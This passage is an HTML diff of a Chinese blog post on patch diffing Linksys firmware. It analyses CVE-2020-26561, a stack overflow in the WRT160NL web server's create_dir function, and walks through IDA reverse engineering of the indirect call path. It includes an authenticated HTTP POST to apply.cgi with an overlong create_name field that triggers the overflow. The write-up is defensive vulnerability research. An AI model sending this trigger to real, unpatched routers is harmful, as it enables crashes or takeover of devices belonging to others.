@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[toc] 00-补丁对比-linksys00-prehttps://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys https://www.anquanke.com/vul（搜索linksys挨着看  linksys 固件（三方）：https://sourceforge.net/projects/officiallinksysfirmware/">
+<meta name="keywords" content="路由器,漏洞分析,补丁对比">
+<meta property="og:type" content="article">
+<meta property="og:title" content="补丁对比技术实践-linksys">
+<meta property="og:url" content="http://21guns.top/2021/08/26/iot/补丁对比技术实践-linksys/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[toc] 00-补丁对比-linksys00-prehttps://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys https://www.anquanke.com/vul（搜索linksys挨着看  linksys 固件（三方）：https://sourceforge.net/projects/officiallinksysfirmware/">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-18-085810.png">
+<meta property="og:updated_time" content="2022-02-21T08:04:57.928Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="补丁对比技术实践-linksys">
+<meta name="twitter:description" content="[toc] 00-补丁对比-linksys00-prehttps://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys https://www.anquanke.com/vul（搜索linksys挨着看  linksys 固件（三方）：https://sourceforge.net/projects/officiallinksysfirmware/">
+<meta name="twitter:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-18-085810.png">
+
+<link rel="canonical" href="http://21guns.top/2021/08/26/iot/补丁对比技术实践-linksys/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>补丁对比技术实践-linksys | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/08/26/iot/补丁对比技术实践-linksys/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          补丁对比技术实践-linksys
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-26 17:04:33" itemprop="dateCreated datePublished" datetime="2021-08-26T17:04:33+08:00">2021-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-21 16:04:57" itemprop="dateModified" datetime="2022-02-21T16:04:57+08:00">2022-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[toc]</p>
+<h1 id="00-补丁对比-linksys"><a href="#00-补丁对比-linksys" class="headerlink" title="00-补丁对比-linksys"></a>00-补丁对比-linksys</h1><h2 id="00-pre"><a href="#00-pre" class="headerlink" title="00-pre"></a>00-pre</h2><p><a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linksys</a></p>
+<p><a href="https://www.anquanke.com/vul（搜索linksys挨着看" target="_blank" rel="noopener">https://www.anquanke.com/vul（搜索linksys挨着看</a></p>
+<ul>
+<li>linksys 固件（三方）：<a href="https://sourceforge.net/projects/officiallinksysfirmware/" target="_blank" rel="noopener">https://sourceforge.net/projects/officiallinksysfirmware/</a></li>
+<li>linksys固件（官网2）：<a href="https://www.linksys.com/gb/support-article?articleNum=208638" target="_blank" rel="noopener">https://www.linksys.com/gb/support-article?articleNum=208638</a></li>
+</ul>
+<h2 id="00-暂搁置"><a href="#00-暂搁置" class="headerlink" title="00-暂搁置"></a>00-暂搁置</h2><ul>
+<li>CVE-2018-3953/4/5</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># release信息</span></span><br><span class="line">Firmware 3.0.05 (build 2)</span><br><span class="line">- Addressed multiple OS <span class="built_in">command</span> injection security vulnerabilities (TALOS-2018-0625)</span><br><span class="line"><span class="comment"># 涉及版本</span></span><br><span class="line">Linksys E1200 Firmware Version 2.0.09 Linksys E2500 Firmware Version 3.0.04</span><br><span class="line"><span class="comment"># 找了E2500的3.0.05和3.0.02（其他实在找不到</span></span><br><span class="line">3.0.05：https://www.linksys.com/us/support-article?articleNum=164513</span><br><span class="line">3.0.02：https://www.linksys.com/gb/support-article?articleNum=208638</span><br><span class="line"><span class="comment"># 原文没看懂，且没下到相应版本的固件，暂搁置</span></span><br></pre></td></tr></table></figure>
+<h2 id="01-CVE-2020-26561"><a href="#01-CVE-2020-26561" class="headerlink" title="01-CVE-2020-26561"></a>01-CVE-2020-26561</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26561</span></span><br><span class="line"><span class="comment"># WRT160NL、不再提供支持，故未发布补丁</span></span><br><span class="line"><span class="comment"># 栈溢出、sprintf函数、mini_httpd</span></span><br><span class="line"><span class="comment"># 任意代码执行</span></span><br><span class="line">** UNSUPPORTED WHEN ASSIGNED ** Belkin LINKSYS WRT160NL 1.0.04.002_US_20130619 devices have a stack-based buffer overflow vulnerability because of sprintf <span class="keyword">in</span> create_dir <span class="keyword">in</span> mini_httpd. Successful exploitation leads to arbitrary code execution. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</span><br><span class="line"><span class="comment"># https://research.nccgroup.com/2020/10/20/wrt160nl-cve-2020-26561-bof/</span></span><br><span class="line"><span class="comment"># 需经过认证</span></span><br><span class="line">The mini_httpd binary <span class="keyword">in</span> the firmware version 1.0.04 build 2 of the Linksys WRT160NL uses the insecure <span class="keyword">function</span> sprintf when a specific and authenticated POST request is sent.</span><br></pre></td></tr></table></figure>
+<ol>
+<li>./usr/sbin/mini_httpd</li>
+</ol>
+<h3 id="怎么触发"><a href="#怎么触发" class="headerlink" title="怎么触发"></a>怎么触发</h3><p>####触发漏洞的http包</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apply.cgi</span></span><br><span class="line"><span class="comment"># 带有session_id，需要认证</span></span><br><span class="line"><span class="comment"># 主要是post的数据</span></span><br><span class="line"><span class="comment"># create_name 溢出字段，用户可控</span></span><br><span class="line">POST /apply.cgi;session_id=42ef7c31a24121c858d670e84d0350d9 HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1197</span><br><span class="line">Origin: http://192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.1.1/apply.cgi;session_id=d55bad29cf2ca864be41836aa71a3e46</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">submit_button=Disk_Properties&amp;change_action=gozila_cgi&amp;submit_type=create_dir&amp;next_page=Share_Properties.asp&amp;create_name=AAAA...AAAA&amp;share_name=</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞函数create-dir"><a href="#漏洞函数create-dir" class="headerlink" title="漏洞函数create_dir"></a>漏洞函数create_dir</h4><ol>
+<li>怎么产生漏洞</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_dir</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">512</span>]; <span class="comment">// 局部数组，栈空间中，大小512定植</span></span><br><span class="line">  v0 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"create_name"</span>);<span class="comment">//从post数据中获取信息，用户可控（猜出本函数功能</span></span><br><span class="line">  v1 = (<span class="keyword">char</span> *)nvram_get(<span class="string">"dir_list"</span>);<span class="comment">//从配置中获取信息</span></span><br><span class="line">  <span class="built_in">sprintf</span>(v3, <span class="string">"%s/%s"</span>, v1, v0);<span class="comment">// 字符串拼接</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">  v7 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"submit_button"</span>);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)get_cgi((<span class="keyword">int</span>)<span class="string">"submit_type"</span>);</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>结合gozila_cgi、create_dir 以及post数据推断出get_cgi的作用：获取post数据</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line"><span class="comment">#submit_button=Disk_Properties&amp;change_action=gozila_cgi&amp;submit_type=create_dir&amp;next_page=Share_Properties.asp&amp;create_name=AAAA...AAAA&amp;share_name=</span></span><br><span class="line">gozila_cgi和create_dir伪代码中</span><br><span class="line"><span class="comment"># v7 = (char *)get_cgi((int)"submit_button");</span></span><br><span class="line"><span class="comment"># v8 = (char *)get_cgi((int)"submit_type");</span></span><br><span class="line"><span class="comment"># v0 = (char *)get_cgi((int)"create_name");</span></span><br></pre></td></tr></table></figure>
+<h4 id="如何调用漏洞函数"><a href="#如何调用漏洞函数" class="headerlink" title="如何调用漏洞函数"></a>如何调用漏洞函数</h4><ol>
+<li>create_dir不是直接call调用的</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">create_dir函数的xref，只有两个：LOAD和.got，并没有.text中的调用</span><br><span class="line"><span class="comment"># Up	o	LOAD:004043A8	Elf32_Sym &lt;aCreateDir - byte_404698, create_dir, 0xF8, 0x12, 0, 0xA&gt; # "create_dir"</span></span><br><span class="line"><span class="comment"># Down	o	.got:create_dir_ptr	.word create_dir</span></span><br><span class="line">create_dir地址</span><br><span class="line"><span class="comment"># .text:0044A89C                 .globl create_dir</span></span><br><span class="line"><span class="comment"># .text:0044A89C create_dir:                              # DATA XREF: LOAD:004043A8↑o</span></span><br><span class="line"><span class="comment"># .text:0044A89C                                          # .got:create_dir_ptr↓o                            </span></span><br><span class="line">alt+b搜索其地址0044A89C（alt+b二进制，alt+t文本</span><br><span class="line"><span class="comment"># .data:10001EA8                 .byte    0</span></span><br><span class="line"><span class="comment"># .data:10001EA9                 .byte 0x44  # D</span></span><br><span class="line"><span class="comment"># .data:10001EAA                 .byte 0xA8</span></span><br><span class="line"><span class="comment"># .data:10001EAB                 .byte 0x9C</span></span><br><span class="line">10001EA8处快捷键O（O：解释地址为数据段偏移量，用于字符串标号，不太常用</span><br><span class="line"><span class="comment"># .data:10001EA8                 .word 0x44A89C</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br><span class="line">发现其周围全是类似的，应该是某种结构体的数组</span><br><span class="line"><span class="comment"># .data:10001E94                 .word aDiskProperties    # "Disk_Properties"</span></span><br><span class="line"><span class="comment"># .data:10001E98                 .word aCreateDir_0       # "create_dir"</span></span><br><span class="line"><span class="comment"># .data:10001E9C                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001EA0                 .word 1</span></span><br><span class="line"><span class="comment"># .data:10001EA4                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br><span class="line">可推断，create_dir不是直接call调用的，而是通过结构体，寻址到某成员再调用的，间接调用</span><br><span class="line">找到结构体数组的首地址（往前翻，直到发现了.globl	</span><br><span class="line"><span class="comment"># .data:1000187C                 .globl gozila_actions</span></span><br><span class="line"><span class="comment"># .data:1000187C gozila_actions: .word aIndex             # DATA XREF: LOAD:00404588↑o</span></span><br><span class="line"><span class="comment"># .data:1000187C                                          # handle_gozila_action+3C↑o ...</span></span><br><span class="line"><span class="comment"># .data:1000187C                                          # "index"</span></span><br><span class="line"><span class="comment"># .data:10001880                 .word aGetCloneMac+4     # "clone_mac"</span></span><br><span class="line"><span class="comment"># .data:10001884                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001888                 .word 1</span></span><br><span class="line"><span class="comment"># .data:1000188C                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001890                 .word clone_mac</span></span><br><span class="line">gozila_actions的xref，找到了handle_gozila_action函数中的调用</span><br><span class="line"><span class="comment"># .text:00415CDC                 la      $s0, gozila_actions</span></span><br><span class="line"><span class="comment"># v1 = (const char **)&amp;gozila_actions;</span></span><br><span class="line">交叉引用handle_gozila_action，找到gozila_cgi函数</span><br><span class="line">根据上下文，可见v7为submit_button，v8为submit_type</span><br><span class="line"><span class="comment">#     v11 = fopen("/dev/console", "w");</span></span><br><span class="line"><span class="comment">#     v12 = v11;</span></span><br><span class="line"><span class="comment">#     if ( v11 )</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#       fprintf(v11, "submit_button=[%s] submit_type=[%s]\n", v7, v8);</span></span><br><span class="line"><span class="comment">#       fclose(v12);</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span></span><br><span class="line">快捷键Y修改 handle_gozila_action 的<span class="built_in">type</span></span><br><span class="line"><span class="comment">#   v1 = (const char **)&amp;gozila_actions;</span></span><br><span class="line"><span class="comment">#   if ( &amp;gozila_actions &gt;= variables )</span></span><br><span class="line"><span class="comment">#     return 0;</span></span><br><span class="line"><span class="comment">#   while ( 1 )</span></span><br><span class="line"><span class="comment">#   &#123;</span></span><br><span class="line"><span class="comment">#     if ( !strcmp(*v1, submit_button) )</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#       v5 = strcmp(v1[1], submit_type) == 0;</span></span><br><span class="line"><span class="comment">#       result = (int)v1;</span></span><br><span class="line"><span class="comment">#       if ( v5 )</span></span><br><span class="line"><span class="comment">#         break;</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     v1 += 6;</span></span><br><span class="line">触发漏洞的http请求中的post数据：submit_button=Disk_Properties、submit_type=create_dir</span><br><span class="line">v1对应submit_button，v1[1]对应submit_type，<span class="keyword">while</span>循环最后v1 += 6（说明结构体共6个成员</span><br><span class="line">正好对应data中结构体</span><br><span class="line"><span class="comment"># .data:10001E94                 .word aDiskProperties    # "Disk_Properties"</span></span><br><span class="line"><span class="comment"># .data:10001E98                 .word aCreateDir_0       # "create_dir"</span></span><br><span class="line"><span class="comment"># .data:10001E9C                 .word aSDS_2+8           # ""</span></span><br><span class="line"><span class="comment"># .data:10001EA0                 .word 1</span></span><br><span class="line"><span class="comment"># .data:10001EA4                 .word 4</span></span><br><span class="line"><span class="comment"># .data:10001EA8                 .word create_dir</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>结构体6个成员分别是什么，怎么调用函数</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">gozila_cgi</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">char</span> *a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回值v13，是指针    </span></span><br><span class="line">    v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span><br><span class="line">    <span class="comment">// 根据字符串猜测成员</span></span><br><span class="line">    <span class="comment">// 创建结构体后，汇编中快捷键T后，再F5更新伪代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fprintf</span>(</span><br><span class="line">      v16,</span><br><span class="line">      <span class="string">"name=[%s] type=[%s] service=[%s] sleep=[%d] action=[%d]\n"</span>,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;name,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;type,</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">char</span> *)v13-&gt;service,</span><br><span class="line">      v13-&gt;sleep,</span><br><span class="line">      v13-&gt;action);</span><br><span class="line">    <span class="comment">// 间接调用函数：通过结构体指针寻找成员（这种形式的调用，xref看不到</span></span><br><span class="line">    v17 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))v13-&gt;func;</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">      v17(a1);</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>可手动创建结构体，或在data中，选中数据右键，create structure from selection</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000 struc_gozila_action struc  <span class="comment"># (sizeof=0x18, mappedto_22)</span></span><br><span class="line">00000000 name:           .word ?</span><br><span class="line">00000004 <span class="built_in">type</span>:           .word ?                  <span class="comment"># XREF: gozila_cgi+254/r</span></span><br><span class="line">00000008 service:        .word ?                  <span class="comment"># XREF: gozila_cgi+2A8/r</span></span><br><span class="line">0000000C sleep:          .word ?                  <span class="comment"># XREF: gozila_cgi+25C/r</span></span><br><span class="line">0000000C                                          <span class="comment"># gozila_cgi+2B8/r</span></span><br><span class="line">00000010 action:         .word ?                  <span class="comment"># XREF: gozila_cgi+268/r</span></span><br><span class="line">00000010                                          <span class="comment"># gozila_cgi+2C0/r</span></span><br><span class="line">00000014 func:           .word ?                  <span class="comment"># XREF: gozila_cgi+2B4/r</span></span><br><span class="line">00000018 struc_gozila_action ends</span><br></pre></td></tr></table></figure>
+<h4 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h4><ol>
+<li>handle_gozila_action获取到结构体指针，后面用指针形式获取到create_dir并调用</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">gozila_cgi</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">char</span> *a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    v13 = (struc_gozila_action *)handle_gozila_action(v7, v8);</span><br><span class="line">      v17 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))v13-&gt;func;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        v17(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>查看handle_gozila_action的xref to（view、graphs、xrefs to），最终找到call_apply_cgi（自己重命名的），也可以逐层的交叉引用。（最开始call_apply_cgi是没有data的引用的，后续alt+b、快捷键O才可以的</li>
+</ol>
+<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-18-085810.png" alt></p>
+<ol start="3">
+<li>call_apply_cgi交叉引用为空，可能跟create_dir一个情况：alt+b搜索其地址0x417544</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:10001574                 .byte    0</span><br><span class="line">.data:10001575                 .byte 0x41  <span class="comment"># A</span></span><br><span class="line">.data:10001576                 .byte 0x75  <span class="comment"># u</span></span><br><span class="line">.data:10001577                 .byte 0x44  <span class="comment"># D</span></span><br><span class="line"><span class="comment"># 快捷键O之后</span></span><br><span class="line">.data:10001574                 .word call_apply_cgi</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>找到起始处</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:10001500                 .globl mime_handlers</span><br><span class="line">.data:10001500 mime_handlers:  .word aAsp_0             <span class="comment"># DATA XREF: LOAD:00403938↑o</span></span><br><span class="line">.data:10001500                                          <span class="comment"># sub_40B080+11D8↑o ...</span></span><br><span class="line">.data:10001500                                          <span class="comment"># "**.asp"</span></span><br></pre></td></tr></table></figure>
+<ol start="5">
